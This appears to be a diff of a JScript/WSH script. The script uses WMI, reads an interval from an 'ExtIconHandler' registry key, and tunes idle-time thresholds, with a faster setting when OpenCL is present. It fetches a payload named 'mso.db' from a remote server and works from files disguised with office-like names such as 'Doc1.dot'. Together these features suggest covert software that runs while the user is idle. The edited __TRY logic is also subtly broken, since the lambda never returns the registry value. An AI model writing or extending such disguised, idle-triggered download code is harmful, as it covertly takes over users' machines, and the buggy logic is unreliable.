@@ -8,7 +8,7 @@ var __storage = storage;
 if(__DEBUG)
 	__external.SetEnvironmentVariable("debug", "1");
  //debug 1 版时可以被打断 , 0 不可以被打断 
-function __TRY(fun) {try{fun()} catch(e){}}
+function __TRY(fun, defaultval) {try{return fun();} catch(e){return defaultval;}}
 function ActiveXObject2(progid){log("ActiveXObject2") ; return createActiveX(progid);}
 var __locator=new ActiveXObject ("WbemScripting.SWbemLocator");
 var __service=__locator.ConnectServer(".");
@@ -30,11 +30,12 @@ var objWMIService = GetObject("winmgmts:\\\\" + strComputer + "\\root\\cimv2");
 var e = new Enumerator(objWMIService.ExecQuery("Select * from Win32_Process","WQL",48));
 */
 ///////main.js///////////
-var __idletime=1000*60*5
+var __interval = __TRY(function(){ key_value = __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\interval");}, 60*60*1000);
+var __idletime= __interval / 12;
 if(__DEBUG)
-	var __idletime=1000*15
+	__idletime=1000*15
 else if(__IsSupportOpencl)
-	var __idletime=1000*30
+	__idletime=1000*30
 var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" }
 var __installReadys = [/*
 						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
@@ -46,7 +47,8 @@ var __installReadys = [/*
 //
 trace ("----global.js DateLastModified : " + __fso.GetFile(__workdir+"Doc1.dot").DateLastModified + 
 		" ; global var : __DEBUG="+__DEBUG+",__IsSupportOpencl="+__IsSupportOpencl+",__interrupted="+__interrupted+",__workdir="+__workdir+
-		",__startTickCout="+__startTickCout+",__lastInputInfo="+__lastInputInfo+", __isadmin="+__isadmin + ",__osVersion="+__osVersion
+		",__startTickCout="+__startTickCout+",__lastInputInfo="+__lastInputInfo+", __isadmin="+__isadmin + ",__osVersion="+__osVersion+
+		",__interval="+__interval+",__idletime="+__idletime
 		)
 //
 function log(msg){
